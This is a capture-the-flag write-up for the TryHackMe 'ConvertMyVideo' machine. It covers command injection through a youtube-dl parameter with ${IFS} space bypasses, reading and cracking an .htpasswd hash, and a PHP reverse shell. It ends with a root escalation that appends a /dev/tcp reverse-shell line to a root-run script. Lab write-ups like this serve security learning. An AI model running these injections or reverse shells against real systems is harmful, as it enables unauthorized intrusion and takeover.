# ConvertMyVideo

![machine=01](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/ConvertMyVideo/img/machine-01.png)


### Recon

Lets kick off our enumeration stage with `nmap`:

![nmap-result-02](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/ConvertMyVideo/img/nmap-02.png)

Here are the results:	

Lets go take a look at this Apache server.


## Apache 

Lets navigate to the site:

![site-03](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/ConvertMyVideo/img/site-03.png)

Lets open Burp, and capture a request for some factitious youtube video ID.
We get following error message from the server:

![burp-04](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/ConvertMyVideo/img/burp-04.png)

Trying to send a legitamte youtube video ID stalls the server for a copule of minutes then 
returns nothing. So while waiting i decided to try directory busting. 


### Directory Busting

I used `ffuf`:

`ffuf -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-2.
3-medium.txt:FUZZ -u http://10.10.79.56/FUZZ`

With it came some itersting results: 

![ffuf-res-05](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/ConvertMyVideo/img/ffuf-res-05.png)


Visiting this URL prompts us for credetials: 

![pass-prompt-06](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/ConvertMyVideo/img/pass-prompt-06.png)

It looks like a basic authintication scheme.

![burp-pass-07](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/ConvertMyVideo/img/burp-pass-07.png)

Yes is it is.  HTTP Basic authentication is the simplest technique for 
enforcing access controls to web resources because it doesnâ€™t require cookies, session 
identifiers, or login pages; rather, HTTP Basic authentication uses standard fields in the 
HTTP header, obviating the need for handshakes.

This matters because, it means the web server is using `.htaccess` and `.htpasswd` files 
to authinticate users. `.htpasswd` is of special interest to us since it hold user credetials.  
If we can find this file on the server we have our entry point. 


### Command Injection

Lets start playing around with the HTTP headers to try and provoke server errors.
What if instead of going to youtube, we point the server to its self? 

![server-err-08](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/ConvertMyVideo/img/server-err-08.png)


Okay, the backend is using `youtube-dl`. It seems like whatever we pass to the `yt_url` 
parameter in our `POST` request, is passed to `youtube-dl` . 
  
`youtube-dl` is an open source project, you can find [here](https://github.com/ytdl-org/youtube-dl) 

Based on its github, the syntax is as follows: 
`youtube-dl [OPTIONS] URL`

In essense, whatever we supply to the `yt_url` parameter becomes the <URL> part above.
Lets try to break out of the `youtube-dl` command. 

To do that, im thinking of a few things, we can either try to send a cariage return sequance 
(works sometimes, not in this case). 

We can try Openining a subshell with backticks \`\` or $() to give priority to whatever is inside. 
(doesnt work in this case either). 

Or, We could also try to use `||` to execute two commands one after the other. 
This works:

![burp-ls-09](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/ConvertMyVideo/img/burp-ls-09.png)

This is a command injection vulnerability, but we have one major issue, we cant uses spaces.
sending something like `||cat /etc/passwd` will break the execution. 

We have to use an espace sequance. After some experimentations ive found that `${IFS}` works:

![burp-esc-10](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/ConvertMyVideo/img/burp-esc-10.png)

Now we can find the `.htpasswd` file with a simple search: `||find${IPS}-name${IFS}.htpasswd`.
This shows that the file is at `admin/.htpasswd`, lets cat it out: 

![creds-11](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/ConvertMyVideo/img/creds-11.png)


### The Admin Panel

The stored credetials are: `itsmeadmin : $apr1$tbcm2uwv$UP1ylvgp4.zLKxWj8mc6y/`, 
its an arp1 hash. Can we crack it with `hashcat`? 

`hashcat --help | grep -i arp1`

![hashcat-help-12](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/ConvertMyVideo/img/hashcat-help-12.png)


Lets crack it: 
`hashcat -m 1600 '$apr1$tbcm2uwv$UP1ylvgp4.zLKxWj8mc6y/' /usr/share/wordlists/rockyou.txt`

![pass-13](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/ConvertMyVideo/img/pass-13.png)

The credtials to the admin panel are `itsmeadmin : jessie`  Lets log in: 
	
![admin-panel-14](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/ConvertMyVideo/img/admin-panel-14.png)

If we take a look at the source code for the page: 

![admin-source-15](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/ConvertMyVideo/img/admin-source-15.png)

It looks for a "c" parameter in the URL, we can use our previous command injection to try
and find the `index.php` file that runs in the backend for this page:

![index-pos-16](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/ConvertMyVideo/img/index-pos-16.png)

Lets cat it out: 

![index-17](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/ConvertMyVideo/img/index-17.png)

The backend checks if any argument was given to the "c" parameter in the URL.
If so, it execute the `system()` function to run whatever was given to it on the OS. 
 
This is another command injection vulnerability: 

![pwned-18](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/ConvertMyVideo/img/pwned-18.png)

Lets send a reverse shell.


### Gaining Access

I like using [pentestmonkey's PHP reverse shell](https://pentestmonkey.net/tools/web-shells/php-reverse-shell). 

Change the port and ip to your situation: 

![pentest-19](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/ConvertMyVideo/img/pentest-19.png)

Start a python server `python3 -m http.server 8888`

And download the file to the target: 

![upload-20](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/ConvertMyVideo/img/upload-20.png)

Start the listener with `nc -lnvp 4242`

Navigate to the file location: 

![navigate-21](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/ConvertMyVideo/img/navigate-21.png)

It stalls, thats a great sign, lets check the listener: 

![shell-22](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/ConvertMyVideo/img/shell-22.png)

Lets move to privilege escalation!


## Privilege Escalation

After looking around a bit, ive found nothing meaningful to exploit. 
Lets fire off `pspy64`:

![priv-esc-23](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/ConvertMyVideo/img/priv-esc-23.png)

We have UID 0 running a script from out user's home directory, Lets check the permissions: 

![perms-24](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/ConvertMyVideo/img/perms-24.png)

We can write to the file, Lets append a reverse shell to it:
`echo '/bin/bash -l > /dev/tcp/10.18.22.182/4242 0<&1 2>&1' >> clean.sh`

A few seconds after setting up the listener we get a connection:

![root-25](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/ConvertMyVideo/img/root-25.png) 
